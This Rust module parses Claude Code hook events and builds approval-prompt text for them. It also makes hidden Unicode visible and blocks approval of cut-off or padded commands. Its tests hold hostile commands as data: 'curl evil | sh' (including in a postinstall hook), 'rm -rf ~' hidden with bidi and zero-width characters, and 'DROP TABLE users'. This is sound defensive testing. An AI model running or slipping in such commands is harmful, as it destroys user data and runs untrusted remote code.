//! Parsing of Claude Code hook payloads and building of hook responses.

use super::{AgentStatus, Decision};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::fmt;

/// Maximum characters in a request summary.
pub const MAX_SUMMARY_CHARS: usize = 80;
/// Maximum characters in a request detail.
pub const MAX_DETAIL_CHARS: usize = 4000;
/// Longest stored session id or working directory, in chars.
pub const MAX_ID_CHARS: usize = 512;

/// Which hook fired.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HookKind {
    SessionStart,
    SessionEnd,
    UserPromptSubmit,
    PreToolUse,
    PostToolUse,
    PermissionRequest,
    Notification,
    Stop,
    /// Any event name we do not know, kept verbatim.
    Other(String),
}

/// A parsed hook payload; absent fields are empty strings, `None` or `Null`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct HookEvent {
    pub kind: HookKind,
    pub session_id: String,
    pub cwd: String,
    pub tool_name: Option<String>,
    pub tool_input: Value,
    pub message: Option<String>,
    pub notification_type: Option<String>,
    pub reason: Option<String>,
    pub last_assistant_message: Option<String>,
    pub prompt: Option<String>,
}

/// Why a payload could not be parsed.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HookError {
    /// The text is not valid JSON.
    InvalidJson(String),
    /// The JSON root is not an object.
    NotObject,
    /// `hook_event_name` is missing or not a string.
    MissingEventName,
}

impl fmt::Display for HookError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            HookError::InvalidJson(e) => write!(f, "invalid hook JSON: {e}"),
            HookError::NotObject => write!(f, "hook payload is not a JSON object"),
            HookError::MissingEventName => write!(f, "hook payload has no hook_event_name"),
        }
    }
}

impl std::error::Error for HookError {}

fn opt_str(obj: &serde_json::Map<String, Value>, key: &str) -> Option<String> {
    obj.get(key).and_then(Value::as_str).map(str::to_owned)
}

impl HookEvent {
    /// Parses a hook payload from stdin text.
    pub fn parse(json_str: &str) -> Result<HookEvent, HookError> {
        let root: Value =
            serde_json::from_str(json_str).map_err(|e| HookError::InvalidJson(e.to_string()))?;
        let obj = root.as_object().ok_or(HookError::NotObject)?;
        let name = obj
            .get("hook_event_name")
            .and_then(Value::as_str)
            .ok_or(HookError::MissingEventName)?;
        let kind = match name {
            "SessionStart" => HookKind::SessionStart,
            "SessionEnd" => HookKind::SessionEnd,
            "UserPromptSubmit" => HookKind::UserPromptSubmit,
            "PreToolUse" => HookKind::PreToolUse,
            "PostToolUse" => HookKind::PostToolUse,
            "PermissionRequest" => HookKind::PermissionRequest,
            "Notification" => HookKind::Notification,
            "Stop" => HookKind::Stop,
            other => HookKind::Other(other.to_owned()),
        };
        Ok(HookEvent {
            kind,
            // Identity fields are stored per session, so their size is bounded.
            session_id: truncate_chars(
                &opt_str(obj, "session_id").unwrap_or_default(),
                MAX_ID_CHARS,
            ),
            cwd: truncate_chars(&opt_str(obj, "cwd").unwrap_or_default(), MAX_ID_CHARS),
            tool_name: opt_str(obj, "tool_name"),
            tool_input: obj.get("tool_input").cloned().unwrap_or(Value::Null),
            message: opt_str(obj, "message"),
            notification_type: opt_str(obj, "notification_type"),
            reason: opt_str(obj, "reason"),
            last_assistant_message: opt_str(obj, "last_assistant_message"),
            prompt: opt_str(obj, "prompt"),
        })
    }

    /// The session status this event implies, or `None` when it changes nothing.
    pub fn status(&self) -> Option<AgentStatus> {
        match &self.kind {
            HookKind::SessionStart | HookKind::Stop => Some(AgentStatus::Idle),
            HookKind::UserPromptSubmit | HookKind::PreToolUse | HookKind::PostToolUse => {
                Some(AgentStatus::Working)
            }
            HookKind::PermissionRequest => Some(AgentStatus::WaitingApproval),
            HookKind::Notification => match self.notification_type.as_deref() {
                Some("idle_prompt") | Some("agent_needs_input") => Some(AgentStatus::WaitingInput),
                _ => None,
            },
            HookKind::SessionEnd => Some(AgentStatus::Ended),
            HookKind::Other(_) => None,
        }
    }
}

/// Cuts `s` to at most `max` chars, ending with an ellipsis when shortened.
pub(crate) fn truncate_chars(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_owned();
    }
    let keep = max.saturating_sub(1);
    let mut out: String = s.chars().take(keep).collect();
    out.push('\u{2026}');
    out
}

fn str_field<'a>(input: &'a Value, key: &str) -> Option<&'a str> {
    input.get(key).and_then(Value::as_str)
}

/// True for characters that can hide or reorder text on screen: control
/// characters other than newline and tab, invisible and zero-width
/// characters, line/paragraph separators, bidirectional controls, and
/// Unicode tag characters.
fn is_deceptive(c: char) -> bool {
    (c.is_control() && c != '\n' && c != '\t')
        || matches!(c,
            '\u{00AD}' | '\u{061C}' | '\u{180E}' | '\u{3164}' | '\u{FEFF}'
            | '\u{200B}'..='\u{200F}' | '\u{2028}'..='\u{202E}' | '\u{2060}'..='\u{2069}'
            | '\u{FE00}'..='\u{FE0F}' | '\u{E0000}'..='\u{E007F}')
}

/// Replaces characters that could make an approval prompt show something
/// other than what will run with U+FFFD, so they are visible instead.
/// Look-alike letters from other scripts are not detected.
pub fn sanitize(s: &str) -> String {
    s.chars()
        .map(|c| if is_deceptive(c) { '\u{FFFD}' } else { c })
        .collect()
}

/// A detail with more lines than this cannot be allowed from the notch.
pub const MAX_DETAIL_LINES: usize = 60;
/// Longest run of blank lines before a detail counts as hiding something.
const MAX_BLANK_RUN: usize = 2;

/// What an approval prompt shows for one tool call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Description {
    /// One line, at most `MAX_SUMMARY_CHARS`.
    pub summary: String,
    /// The complete tool input: the main argument first, then every other
    /// field as JSON. At most `MAX_DETAIL_CHARS`.
    pub detail: String,
    /// The detail cannot be reviewed in full: it was cut, is very long, or
    /// pushes content out of sight with blank lines. The UI must not offer
    /// "Allow" for something the user cannot read.
    pub truncated: bool,
}

/// Describes a tool call for an approval prompt. Everything in
/// `tool_input` ends up in the detail, with deceptive characters made
/// visible, so nothing the tool will receive is hidden from the user.
pub fn describe(tool_name: &str, tool_input: &Value) -> Description {
    let (summary, _) = summarize(tool_name, tool_input);
    let full = sanitize(&full_detail(tool_name, tool_input));
    let detail = truncate_chars(&full, MAX_DETAIL_CHARS);
    let truncated = detail != full || hides_content(&detail);
    Description {
        summary,
        detail,
        truncated,
    }
}

/// The main argument as plain text, followed by all remaining fields.
fn full_detail(tool_name: &str, tool_input: &Value) -> String {
    let Some(fields) = tool_input.as_object() else {
        return match tool_input {
            Value::Null => tool_name.to_owned(),
            other => pretty(other),
        };
    };
    let key = primary_key(tool_name).filter(|k| fields.get(*k).is_some_and(Value::is_string));
    let Some(key) = key else {
        return if fields.is_empty() {
            tool_name.to_owned()
        } else {
            pretty(tool_input)
        };
    };
    let main = fields.get(key).and_then(Value::as_str).unwrap_or_default();
    let rest: serde_json::Map<String, Value> = fields
        .iter()
        .filter(|(k, _)| k.as_str() != key)
        .map(|(k, v)| (k.clone(), v.clone()))
        .collect();
    if rest.is_empty() {
        main.to_owned()
    } else {
        format!("{main}\n\n{}", pretty(&Value::Object(rest)))
    }
}

/// JSON with real line breaks inside strings, so multi-line content (a file
/// being written, a script) reads as it will be used.
fn pretty(value: &Value) -> String {
    let mut out = String::new();
    render(value, 0, &mut out);
    out
}

fn render(value: &Value, depth: usize, out: &mut String) {
    let pad = "  ".repeat(depth + 1);
    match value {
        Value::String(s) => {
            out.push('"');
            out.push_str(s);
            out.push('"');
        }
        Value::Array(items) if !items.is_empty() => {
            out.push('[');
            for (i, item) in items.iter().enumerate() {
                out.push_str(if i == 0 { "\n" } else { ",\n" });
                out.push_str(&pad);
                render(item, depth + 1, out);
            }
            out.push('\n');
            out.push_str(&"  ".repeat(depth));
            out.push(']');
        }
        Value::Object(fields) if !fields.is_empty() => {
            out.push('{');
            for (i, (key, item)) in fields.iter().enumerate() {
                out.push_str(if i == 0 { "\n" } else { ",\n" });
                out.push_str(&pad);
                out.push_str(key);
                out.push_str(": ");
                render(item, depth + 1, out);
            }
            out.push('\n');
            out.push_str(&"  ".repeat(depth));
            out.push('}');
        }
        other => out.push_str(&other.to_string()),
    }
}

/// Too many lines to review, or blank-line padding that pushes text out of view.
fn hides_content(detail: &str) -> bool {
    let mut blank_run = 0;
    let mut lines = 0;
    for line in detail.lines() {
        lines += 1;
        blank_run = if line.trim().is_empty() {
            blank_run + 1
        } else {
            0
        };
        if blank_run > MAX_BLANK_RUN || lines > MAX_DETAIL_LINES {
            return true;
        }
    }
    false
}

/// The field shown first for tools whose input has an obvious main argument.
fn primary_key(tool_name: &str) -> Option<&'static str> {
    match tool_name {
        "Bash" => Some("command"),
        "Edit" | "Write" | "Read" | "MultiEdit" => Some("file_path"),
        "NotebookEdit" => Some("notebook_path"),
        "WebFetch" => Some("url"),
        _ => None,
    }
}

/// The argument used for the one-line summary and whether it came from a known field.
fn primary_value<'a>(tool_name: &str, tool_input: &'a Value) -> (Option<&'a str>, bool) {
    let primary = primary_key(tool_name)
        .and_then(|k| str_field(tool_input, k))
        .or_else(|| match tool_name {
            "NotebookEdit" => str_field(tool_input, "file_path"),
            _ => None,
        });
    let known = primary.is_some();
    let value = primary.or_else(|| {
        tool_input
            .as_object()
            .and_then(|o| o.values().find_map(Value::as_str))
    });
    (value, known)
}

/// Builds `(summary, main argument)` for a permission prompt; summary <= 80
/// chars, argument <= `MAX_DETAIL_CHARS`, both sanitized. The prompt itself
/// uses [`describe`], whose detail holds the whole input.
pub fn summarize(tool_name: &str, tool_input: &Value) -> (String, String) {
    let (summary, detail) = summarize_raw(&sanitize(tool_name), tool_input);
    (sanitize(&summary), sanitize(&detail))
}

fn summarize_raw(tool_name: &str, tool_input: &Value) -> (String, String) {
    let (value, known) = primary_value(tool_name, tool_input);
    let Some(value) = value else {
        return (
            truncate_chars(tool_name, MAX_SUMMARY_CHARS),
            truncate_chars(tool_name, MAX_DETAIL_CHARS),
        );
    };
    let detail = truncate_chars(value, MAX_DETAIL_CHARS);
    // Summary is one line; multi-line commands show only the first.
    let first_line = value.lines().next().unwrap_or("");
    let summary = if known {
        truncate_chars(first_line, MAX_SUMMARY_CHARS)
    } else {
        truncate_chars(&format!("{tool_name}: {first_line}"), MAX_SUMMARY_CHARS)
    };
    (summary, detail)
}

/// The JSON a hook CLI prints for a decision; `None` for `Pass` (print nothing).
pub fn decision_output(decision: Decision) -> Option<String> {
    match decision {
        Decision::Allow => Some(
            r#"{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}"#
                .to_owned(),
        ),
        Decision::Deny => Some(
            r#"{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"deny","message":"Denied from LiteNotch"}}}"#
                .to_owned(),
        ),
        Decision::Pass => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn ev(json: &str) -> HookEvent {
        HookEvent::parse(json).unwrap()
    }

    #[test]
    fn parse_reads_all_fields() {
        let e = ev(
            r#"{"hook_event_name":"Notification","session_id":"s1","cwd":"/a/b",
            "tool_name":"Bash","tool_input":{"command":"ls"},"message":"m",
            "notification_type":"idle_prompt","reason":"r","last_assistant_message":"l","prompt":"p"}"#,
        );
        assert_eq!(e.kind, HookKind::Notification);
        assert_eq!(e.session_id, "s1");
        assert_eq!(e.cwd, "/a/b");
        assert_eq!(e.tool_name.as_deref(), Some("Bash"));
        assert_eq!(e.tool_input, json!({"command":"ls"}));
        assert_eq!(e.message.as_deref(), Some("m"));
        assert_eq!(e.notification_type.as_deref(), Some("idle_prompt"));
        assert_eq!(e.reason.as_deref(), Some("r"));
        assert_eq!(e.last_assistant_message.as_deref(), Some("l"));
        assert_eq!(e.prompt.as_deref(), Some("p"));
    }

    #[test]
    fn parse_defaults_missing_fields() {
        let e = ev(r#"{"hook_event_name":"Stop"}"#);
        assert_eq!(e.session_id, "");
        assert_eq!(e.cwd, "");
        assert_eq!(e.tool_name, None);
        assert_eq!(e.tool_input, Value::Null);
        assert_eq!(e.message, None);
    }

    #[test]
    fn parse_maps_every_known_event_name() {
        let cases = [
            ("SessionStart", HookKind::SessionStart),
            ("SessionEnd", HookKind::SessionEnd),
            ("UserPromptSubmit", HookKind::UserPromptSubmit),
            ("PreToolUse", HookKind::PreToolUse),
            ("PostToolUse", HookKind::PostToolUse),
            ("PermissionRequest", HookKind::PermissionRequest),
            ("Notification", HookKind::Notification),
            ("Stop", HookKind::Stop),
        ];
        for (name, kind) in cases {
            let e = ev(&format!(r#"{{"hook_event_name":"{name}"}}"#));
            assert_eq!(e.kind, kind);
        }
    }

    #[test]
    fn parse_unknown_event_becomes_other() {
        let e = ev(r#"{"hook_event_name":"PreCompact"}"#);
        assert_eq!(e.kind, HookKind::Other("PreCompact".into()));
        assert_eq!(e.status(), None);
    }

    #[test]
    fn parse_rejects_bad_input() {
        assert!(matches!(
            HookEvent::parse("{nope"),
            Err(HookError::InvalidJson(_))
        ));
        assert_eq!(
            HookEvent::parse(""),
            Err(HookError::InvalidJson(
                "EOF while parsing a value at line 1 column 0".into()
            ))
        );
        assert_eq!(HookEvent::parse("[1]"), Err(HookError::NotObject));
        assert_eq!(HookEvent::parse("{}"), Err(HookError::MissingEventName));
        assert_eq!(
            HookEvent::parse(r#"{"hook_event_name":5}"#),
            Err(HookError::MissingEventName)
        );
    }

    #[test]
    fn parse_ignores_wrongly_typed_fields() {
        let e = ev(r#"{"hook_event_name":"Stop","session_id":7,"message":{"a":1}}"#);
        assert_eq!(e.session_id, "");
        assert_eq!(e.message, None);
    }

    #[test]
    fn parse_keeps_unicode() {
        let e = ev(r#"{"hook_event_name":"UserPromptSubmit","prompt":"แก้บั๊ก 🐛"}"#);
        assert_eq!(e.prompt.as_deref(), Some("แก้บั๊ก 🐛"));
    }

    #[test]
    fn error_display_is_readable() {
        assert!(HookError::InvalidJson("x".into()).to_string().contains("x"));
        assert!(HookError::NotObject.to_string().contains("object"));
        assert!(HookError::MissingEventName
            .to_string()
            .contains("hook_event_name"));
    }

    fn status_of(name: &str, nt: Option<&str>) -> Option<AgentStatus> {
        let mut e = ev(&format!(r#"{{"hook_event_name":"{name}"}}"#));
        e.notification_type = nt.map(str::to_owned);
        e.status()
    }

    #[test]
    fn status_mapping_follows_contract() {
        assert_eq!(status_of("SessionStart", None), Some(AgentStatus::Idle));
        assert_eq!(
            status_of("UserPromptSubmit", None),
            Some(AgentStatus::Working)
        );
        assert_eq!(status_of("PreToolUse", None), Some(AgentStatus::Working));
        assert_eq!(status_of("PostToolUse", None), Some(AgentStatus::Working));
        assert_eq!(
            status_of("PermissionRequest", None),
            Some(AgentStatus::WaitingApproval)
        );
        assert_eq!(status_of("Stop", None), Some(AgentStatus::Idle));
        assert_eq!(status_of("SessionEnd", None), Some(AgentStatus::Ended));
    }

    #[test]
    fn notification_status_depends_on_type() {
        assert_eq!(
            status_of("Notification", Some("idle_prompt")),
            Some(AgentStatus::WaitingInput)
        );
        assert_eq!(
            status_of("Notification", Some("agent_needs_input")),
            Some(AgentStatus::WaitingInput)
        );
        assert_eq!(status_of("Notification", Some("other")), None);
        assert_eq!(status_of("Notification", None), None);
    }

    #[test]
    fn summarize_bash_shows_command() {
        let (s, d) = summarize("Bash", &json!({"command":"cargo test","description":"x"}));
        assert_eq!(s, "cargo test");
        assert_eq!(d, "cargo test");
    }

    #[test]
    fn summarize_bash_multiline_summary_is_first_line_detail_is_full() {
        let (s, d) = summarize("Bash", &json!({"command":"echo a\necho b"}));
        assert_eq!(s, "echo a");
        assert_eq!(d, "echo a\necho b");
    }

    #[test]
    fn summarize_file_tools_show_path() {
        for t in ["Edit", "Write", "Read"] {
            let (s, d) = summarize(t, &json!({"file_path":"/x/y.rs","content":"zzz"}));
            assert_eq!(s, "/x/y.rs");
            assert_eq!(d, "/x/y.rs");
        }
        let (s, _) = summarize("NotebookEdit", &json!({"notebook_path":"/n.ipynb"}));
        assert_eq!(s, "/n.ipynb");
        let (s, _) = summarize("NotebookEdit", &json!({"file_path":"/m.ipynb"}));
        assert_eq!(s, "/m.ipynb");
    }

    #[test]
    fn summarize_webfetch_shows_url() {
        let (s, _) = summarize("WebFetch", &json!({"url":"https://a.dev","prompt":"p"}));
        assert_eq!(s, "https://a.dev");
    }

    #[test]
    fn summarize_unknown_tool_uses_name_and_first_string() {
        let (s, d) = summarize("mcp__x__do", &json!({"n":1,"q":"hello"}));
        assert_eq!(s, "mcp__x__do: hello");
        assert_eq!(d, "hello");
    }

    #[test]
    fn summarize_known_tool_missing_field_falls_back_to_generic() {
        let (s, _) = summarize("Bash", &json!({"timeout":5,"x":"y"}));
        assert_eq!(s, "Bash: y");
    }

    #[test]
    fn summarize_without_strings_returns_tool_name() {
        assert_eq!(
            summarize("Foo", &json!({"n":1})),
            ("Foo".into(), "Foo".into())
        );
        assert_eq!(summarize("Foo", &Value::Null), ("Foo".into(), "Foo".into()));
        assert_eq!(summarize("Foo", &json!([1])), ("Foo".into(), "Foo".into()));
    }

    #[test]
    fn summarize_empty_command_is_empty_summary() {
        let (s, d) = summarize("Bash", &json!({"command":""}));
        assert_eq!(s, "");
        assert_eq!(d, "");
    }

    #[test]
    fn summarize_truncates_to_limits_by_chars() {
        let long = "é".repeat(MAX_DETAIL_CHARS + 100);
        let (s, d) = summarize("Bash", &json!({"command": long}));
        assert_eq!(s.chars().count(), MAX_SUMMARY_CHARS);
        assert_eq!(d.chars().count(), MAX_DETAIL_CHARS);
        assert!(s.ends_with('\u{2026}'));
        let (s, _) = summarize("Foo", &json!({"a": "x".repeat(500)}));
        assert_eq!(s.chars().count(), MAX_SUMMARY_CHARS);
        let (s, d) = summarize(&"T".repeat(MAX_DETAIL_CHARS + 100), &json!(null));
        assert_eq!(s.chars().count(), MAX_SUMMARY_CHARS);
        assert_eq!(d.chars().count(), MAX_DETAIL_CHARS);
    }

    #[test]
    fn summarize_keeps_text_at_exact_limit() {
        let exact = "a".repeat(MAX_SUMMARY_CHARS);
        let (s, _) = summarize("Bash", &json!({"command": exact.clone()}));
        assert_eq!(s, exact);
    }

    #[test]
    fn truncate_handles_zero_max() {
        assert_eq!(truncate_chars("abc", 0), "\u{2026}");
        assert_eq!(truncate_chars("", 0), "");
    }

    #[test]
    fn decision_output_allow_matches_contract() {
        assert_eq!(
            decision_output(Decision::Allow).as_deref(),
            Some(
                r#"{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}"#
            )
        );
    }

    #[test]
    fn decision_output_deny_includes_message() {
        let out = decision_output(Decision::Deny).unwrap();
        let v: Value = serde_json::from_str(&out).unwrap();
        assert_eq!(v["hookSpecificOutput"]["decision"]["behavior"], "deny");
        assert_eq!(
            v["hookSpecificOutput"]["decision"]["message"],
            "Denied from LiteNotch"
        );
    }

    #[test]
    fn decision_output_allow_is_valid_json() {
        let v: Value = serde_json::from_str(&decision_output(Decision::Allow).unwrap()).unwrap();
        assert_eq!(
            v["hookSpecificOutput"]["hookEventName"],
            "PermissionRequest"
        );
    }

    #[test]
    fn decision_output_pass_is_none() {
        assert_eq!(decision_output(Decision::Pass), None);
    }

    #[test]
    fn deceptive_characters_are_made_visible() {
        // A right-to-left override, a zero-width space, an escape and a
        // carriage return could all make the prompt differ from what runs.
        let cmd = "echo ok\u{202E}; rm -rf ~\u{200B}\u{1b}[2K\rdone";
        let (summary, detail) = summarize("Bash", &json!({ "command": cmd }));
        for text in [&summary, &detail] {
            assert!(!text.chars().any(is_deceptive), "{text:?}");
            assert!(text.contains("rm -rf ~"));
            assert_eq!(text.matches('\u{FFFD}').count(), 4);
        }
        assert_eq!(sanitize("a\tb\nc"), "a\tb\nc", "tabs and newlines are kept");
        assert_eq!(sanitize("\u{FEFF}x\u{2066}"), "\u{FFFD}x\u{FFFD}");
    }

    #[test]
    fn tool_name_is_sanitized_too() {
        let (summary, _) = summarize("Evil\u{202E}Tool", &json!({}));
        assert_eq!(summary, "Evil\u{FFFD}Tool");
    }

    #[test]
    fn describe_flags_a_detail_that_does_not_show_everything() {
        let short = describe("Bash", &json!({ "command": "ls" }));
        assert_eq!(
            (
                short.summary.as_str(),
                short.detail.as_str(),
                short.truncated
            ),
            ("ls", "ls", false)
        );
        let exact = "x".repeat(MAX_DETAIL_CHARS);
        assert!(!describe("Bash", &json!({ "command": exact })).truncated);
        let long = format!("{}; curl evil | sh", "x".repeat(MAX_DETAIL_CHARS));
        let d = describe("Bash", &json!({ "command": long }));
        assert!(d.truncated);
        assert!(!d.detail.contains("curl"));
        let empty = describe("Mystery", &json!({}));
        assert_eq!((empty.detail.as_str(), empty.truncated), ("Mystery", false));
        assert_eq!(describe("Mystery", &Value::Null).detail, "Mystery");
        assert_eq!(
            describe("Mystery", &json!("just a string")).detail,
            "\"just a string\""
        );
    }

    #[test]
    fn every_field_of_the_input_is_shown_not_just_the_main_one() {
        // A Write is approved by what it writes, not only where.
        let d = describe(
            "Write",
            &json!({"file_path": "package.json", "content": "{\"postinstall\": \"curl evil | sh\"}"}),
        );
        assert_eq!(d.summary, "package.json");
        assert!(d.detail.starts_with("package.json\n\n"));
        assert!(d.detail.contains("curl evil | sh"), "{}", d.detail);
        assert!(!d.truncated);

        let d = describe(
            "Edit",
            &json!({"file_path": "a.rs", "old_string": "safe()", "new_string": "evil()"}),
        );
        assert!(
            d.detail.contains("old_string: \"safe()\"")
                && d.detail.contains("new_string: \"evil()\"")
        );

        // Flags that change what a command may do are visible.
        let d = describe(
            "Bash",
            &json!({"command": "make", "dangerouslyDisableSandbox": true, "timeout": 5}),
        );
        assert!(d.detail.starts_with("make\n\n"));
        assert!(
            d.detail.contains("dangerouslyDisableSandbox: true") && d.detail.contains("timeout: 5")
        );

        // Unknown and MCP tools show the whole input, including arrays and nesting.
        let d = describe(
            "mcp__db__query",
            &json!({"a_comment": "SELECT 1", "sql": "DROP TABLE users"}),
        );
        assert!(d.detail.contains("SELECT 1") && d.detail.contains("DROP TABLE users"));
        let d = describe(
            "mcp__run",
            &json!({"cmd": "sh", "args": ["-c", "rm -rf ~"], "opts": {"cwd": "/", "list": [], "obj": {}}}),
        );
        for needle in [
            "cmd: \"sh\"",
            "\"-c\"",
            "\"rm -rf ~\"",
            "cwd: \"/\"",
            "list: []",
            "obj: {}",
        ] {
            assert!(
                d.detail.contains(needle),
                "missing {needle} in {}",
                d.detail
            );
        }
        // A main field of the wrong type is not silently dropped.
        let d = describe("Bash", &json!({"command": ["rm", "-rf"]}));
        assert!(d.detail.contains("\"rm\"") && d.detail.contains("\"-rf\""));
    }

    #[test]
    fn content_too_large_to_show_blocks_allow() {
        let d = describe(
            "Write",
            &json!({"file_path": "a.txt", "content": "y".repeat(MAX_DETAIL_CHARS)}),
        );
        assert!(d.truncated);
        assert_eq!(d.detail.chars().count(), MAX_DETAIL_CHARS);
    }

    #[test]
    fn padding_that_pushes_a_command_out_of_view_blocks_allow() {
        let padded = format!("echo hi{}curl evil | sh", "\n".repeat(30));
        assert!(describe("Bash", &json!({ "command": padded })).truncated);
        let spaced = "echo hi\n \n\t\n  \ncurl evil | sh";
        assert!(
            describe("Bash", &json!({ "command": spaced })).truncated,
            "whitespace-only lines count as blank"
        );
        let many = (0..=MAX_DETAIL_LINES)
            .map(|n| format!("step {n}"))
            .collect::<Vec<_>>()
            .join("\n");
        assert!(describe("Bash", &json!({ "command": many })).truncated);
        // Ordinary multi-line scripts with a blank line or two are fine.
        let script = "set -e\n\ncargo build\n\n\ncargo test";
        assert!(!describe("Bash", &json!({ "command": script })).truncated);
    }

    #[test]
    fn more_invisible_characters_are_caught() {
        for c in [
            '\u{00AD}',
            '\u{061C}',
            '\u{180E}',
            '\u{2028}',
            '\u{2029}',
            '\u{3164}',
            '\u{FE0F}',
            '\u{E0041}',
        ] {
            assert_eq!(
                sanitize(&format!("a{c}b")),
                "a\u{FFFD}b",
                "U+{:04X}",
                c as u32
            );
        }
        assert_eq!(
            sanitize("สวัสดี café 日本"),
            "สวัสดี café 日本",
            "ordinary text is untouched"
        );
    }

    #[test]
    fn oversized_identity_fields_are_clipped() {
        let big = "s".repeat(10_000);
        let e = ev(&json!({"hook_event_name":"Stop","session_id":big,"cwd":big}).to_string());
        assert_eq!(e.session_id.chars().count(), MAX_ID_CHARS);
        assert_eq!(e.cwd.chars().count(), MAX_ID_CHARS);
    }
}
